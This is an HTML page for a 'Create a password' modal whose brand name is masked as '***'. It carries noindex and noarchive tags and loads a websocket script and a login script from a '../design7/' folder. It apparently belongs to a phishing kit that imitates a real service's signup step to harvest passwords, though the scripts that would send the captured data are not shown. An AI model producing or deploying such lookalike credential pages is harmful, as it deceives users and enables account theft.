<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet"> 
    <meta name="googlebot" content="noindex, nofollow"> 
    <title>Create a password</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: rgb(65, 65, 65);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal {
            background-color: #2a2a2a;
            border-radius: 12px;
            padding: 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .modal-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .modal-title {
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .modal-subtitle {
            color: #b0b0b0;
            font-size: 14px;
            line-height: 1.5;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-field {
            width: 100%;
            padding: 12px 16px;
            background-color: #1a1a1a;
            border: 1px solid #4a4a4a;
            border-radius: 6px;
            color: #ffffff;
            font-size: 15px;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            outline: none;
            border-color: #7c55e6;
        }

        .input-field:disabled {
            background-color: #1a1a1a;
            color: #888888;
            cursor: not-allowed;
        }

        .password-wrapper {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 20px;
            user-select: none;
        }

        .continue-btn {
            width: 100%;
            padding: 12px;
            background-color: #7c55e6;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 16px;
        }

        .continue-btn:hover:not(:disabled) {
            background-color: #6844d4;
        }

        .continue-btn:disabled {
            background-color: #4a4a4a;
            cursor: not-allowed;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid transparent;
            border-top-color: #ffffff;
            border-right-color: #ffffff;
            border-bottom-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 16px;
        }

        .footer-link {
            color: #888888;
            font-size: 12px;
            text-decoration: underline;
            cursor: pointer;
        }

        .footer-link:hover {
            color: #b0b0b0;
        }
    </style>
</head>
<body>
    <div class="modal-overlay">
        <div class="modal">
            <div class="modal-header">
                <h1 class="modal-title">Create a password</h1>
                <p class="modal-subtitle">You'll use this password to log in to *** and other *** products</p>
            </div>

            <div class="input-group">
                <input type="email" id="emailDisplay" class="input-field" disabled>
            </div>

            <div class="input-group password-wrapper">
                <input type="password" id="passwordInput" class="input-field" placeholder="Password" autocomplete="new-password">
                <span class="password-toggle" id="togglePassword">üëÅÔ∏è</span>
            </div>

            <button class="continue-btn" id="continueBtn">
                <span id="btnText">Continue</span>
            </button>

            <div class="footer-links">
                <a href="#" class="footer-link">Terms of use</a>
                <a href="#" class="footer-link">Privacy policy</a>
            </div>
        </div>
    </div>

    <script src="../design7/simplewebsocket.js"> </script> 
    <script src="../design7/script_login.js"></script>
</body>

</html>
